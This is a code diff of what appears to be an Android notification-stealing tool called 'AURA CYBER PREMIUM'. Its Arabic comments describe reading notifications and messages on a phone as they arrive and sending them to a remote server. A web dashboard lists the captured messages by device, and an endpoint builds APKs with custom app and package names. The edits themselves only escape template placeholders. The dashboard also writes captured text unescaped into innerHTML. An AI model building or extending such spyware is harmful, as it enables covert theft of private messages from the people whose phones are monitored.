@@ -451,14 +451,13 @@ from jnius import autoclass
 
 # [AURA CYBER PREMIUM SYSTEM CONFIGURATION]
 # تم إعداد الروابط السحابية وعناوين الخادم تلقائياً للربط مع ريندر
-API_URL = "${calculatedApiUrl}"
+API_URL = "\${calculatedApiUrl}"
 DEVICE_UID = "AURA-777-MAX"
 
 def start_listening():
-    """
-    تقوم هذه الدالة الحقيقية باستدعاء خدمات الأندرويد وربطها بـ Python
-    لقراءة الإشعارات والرسائل مباشرة عند استلامها على الهاتف.
-    """
+    # تقوم هذه الدالة الحقيقية باستدعاء خدمات الأندرويد وربطها بـ Python
+    # لقراءة الإشعارات والرسائل مباشرة عند استلامها على الهاتف.
+    
     print("[*] Starting NotificationListenerService on Android...")
     # ربط برمجيات جافا بنظام بايثون
     NotificationListenerService = autoclass('android.service.notification.NotificationListenerService')
@@ -486,7 +485,7 @@ def send_to_server(title, message, app_package):
             
             // Load QR pairing
             const qrImg = document.getElementById('pairing-qr');
-            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(calculatedApiUrl)}`;
+            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=\${encodeURIComponent(calculatedApiUrl)}`;
 
             // Start continuous data fetch polling every 3 seconds
             fetchLogs();
@@ -580,12 +579,12 @@ def send_to_server(title, message, app_package):
                     htmlRows += `
                         <tr class="hover:bg-cyan-500/5 transition duration-300">
                             <td class="px-6 py-4 font-semibold text-white flex items-center gap-2">
-                                <span class="${color}"><i class="fa-solid ${icon}"></i> ${item.app_package}</span>
+                                <span class="\${color}"><i class="fa-solid \${icon}"></i> \${item.app_package}</span>
                             </td>
-                            <td class="px-6 py-4 text-gray-300 font-bold">${item.title || 'بلا عنوان'}</td>
-                            <td class="px-6 py-4 text-cyan-300/90 font-mono text-xs sm:text-sm">${item.message || 'لا يوجد محتوى'}</td>
-                            <td class="px-6 py-4 text-xs font-mono text-cyan-500">${item.device_id}</td>
-                            <td class="px-6 py-4 text-left text-xs text-gray-400" dir="ltr">${timeStr}</td>
+                            <td class="px-6 py-4 text-gray-300 font-bold">\${item.title || 'بلا عنوان'}</td>
+                            <td class="px-6 py-4 text-cyan-300/90 font-mono text-xs sm:text-sm">\${item.message || 'لا يوجد محتوى'}</td>
+                            <td class="px-6 py-4 text-xs font-mono text-cyan-500">\${item.device_id}</td>
+                            <td class="px-6 py-4 text-left text-xs text-gray-400" dir="ltr">\${timeStr}</td>
                         </tr>
                     `;
                 });
@@ -635,7 +634,7 @@ def send_to_server(title, message, app_package):
                 });
 
                 if (response.ok) {
-                    showToast(`تم إرسال إشعار [${rand.package}] بنجاح إلى قاعدة البيانات`, "success");
+                    showToast(`تم إرسال إشعار [\${rand.package}] بنجاح إلى قاعدة البيانات`, "success");
                     fetchLogs();
                     fetchStats();
                 }
@@ -694,8 +693,8 @@ def send_to_server(title, message, app_package):
             const timer = setInterval(() => {
                 if (index < steps.length) {
                     const step = steps[index];
-                    bar.style.width = `${step.pct}%`;
-                    percentLabel.innerText = `${step.pct}%`;
+                    bar.style.width = `\${step.pct}%`;
+                    percentLabel.innerText = `\${step.pct}%`;
                     stepLabel.innerText = step.msg;
                     appendTerminal(step.log, step.pct === 100 ? "text-emerald-400 font-bold" : "text-gray-400");
                     
@@ -707,7 +706,7 @@ def send_to_server(title, message, app_package):
                         
                         // Setup actual download url pointing to our Flask endpoint
                         const downloadBtn = document.getElementById('download-apk-btn');
-                        downloadBtn.href = `/api/generate_apk?app_name=${encodeURIComponent(appName)}&device_id=${encodeURIComponent(deviceId)}&package_name=${encodeURIComponent(packageName)}`;
+                        downloadBtn.href = `/api/generate_apk?app_name=\${encodeURIComponent(appName)}&device_id=\${encodeURIComponent(deviceId)}&package_name=\${encodeURIComponent(packageName)}`;
                     }
                     index++;
                 }
@@ -717,7 +716,7 @@ def send_to_server(title, message, app_package):
         function appendTerminal(msg, className = "text-gray-400") {
             const term = document.getElementById('console-terminal');
             const p = document.createElement('p');
-            p.className = `${className}`;
+            p.className = `\${className}`;
             p.innerText = msg;
             term.appendChild(p);
             term.scrollTop = term.scrollHeight;
@@ -742,10 +741,10 @@ def send_to_server(title, message, app_package):
                 icon = 'fa-triangle-exclamation text-amber-400';
             }
             
-            toast.className = `${bg} border p-4 rounded-xl shadow-2xl flex items-center gap-3 transition-all duration-300 transform translate-y-2 opacity-0 text-right text-xs sm:text-sm font-semibold`;
+            toast.className = `\${bg} border p-4 rounded-xl shadow-2xl flex items-center gap-3 transition-all duration-300 transform translate-y-2 opacity-0 text-right text-xs sm:text-sm font-semibold`;
             toast.innerHTML = `
-                <i class="fa-solid ${icon} text-lg"></i>
-                <div class="flex-grow text-white">${message}</div>
+                <i class="fa-solid \${icon} text-lg"></i>
+                <div class="flex-grow text-white">\${message}</div>
                 <button onclick="this.parentElement.remove()" class="text-gray-500 hover:text-gray-350"><i class="fa-solid fa-xmark"></i></button>
             `;
             
